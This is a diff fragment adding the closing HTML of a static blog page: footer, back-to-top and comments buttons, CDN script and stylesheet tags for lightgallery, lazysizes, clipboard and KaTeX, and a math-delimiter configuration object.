+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2025</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/auto-render.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/copy-tex.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js"></script></body>
+</html>
